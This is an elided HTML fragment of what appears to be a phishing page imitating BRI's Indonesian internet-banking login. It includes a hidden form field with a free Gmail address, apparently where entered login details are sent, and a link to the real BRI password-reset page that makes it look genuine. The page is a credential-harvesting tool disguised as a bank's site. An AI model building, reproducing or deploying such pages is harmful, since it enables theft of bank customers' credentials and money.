...
<html lang="en"><head>
  ...
  <body>
    <div class="container">
        <div class="row">
            <div class="col-12 d-block mx-auto text-center p-0" style="height: 310px; width: 460px; max-width: 100%; margin-top: -2px; border-radius: 0px;">
                <img alt="" src="https://i.ibb.co/xfjT07Q/1658047233080.jpg" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;">
            </div>
        </div>
            ...
            <div class="row">
                <div class="col-12" style="width: 439px; max-width: 100%; display: block; margin: -20px auto;">
                  ...
                  <input type="hidden" name="email" value="notifbri99@gmail.com">
                    ...
                    <div class="text-header" style="float: right; position: relative; z-index: 999; display: block; margin-top: 15px;"><font style="font-size: 16px" color="#000000"><strong><a href="https://ib.bri.co.id/ib-bri/id/forget-password.html" target="_blank" style="color: #000; text-decoration: none;">Lupa Password?</a></strong></font></div>
                </div>
            </div>
            <div class="row mt-3">
                <div class="col-12" style="width: 429px; max-width: 100%; display: block; margin: -20px auto;">
                    <button class="btn-login" type="submit">Login</button>

                    <div class="bubble-r-box" style="height: 57px; float: right; display: block; margin-top: -65px; margin-right: -12px; width: 61px;">
                        <div class="bubble-element Group" style="box-sizing: border-box; width: 55px; background-color: rgb(0, 111, 214); border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; height: 57px;">
                            <div class="bubble-r-line" style="margin-top: 9px; height: 38px;">
                                <div class="bubble-r-box" style="height: 38px; padding-top: 6px; width: 45px; position: relative; display: block; margin: auto;">
                                    <div class="bubble-element HTML" style="box-sizing: border-box; z-index: 2; height: auto; width: 45px; position: relative; display: block; margin: auto; padding: 4px; border-radius: 0px;">
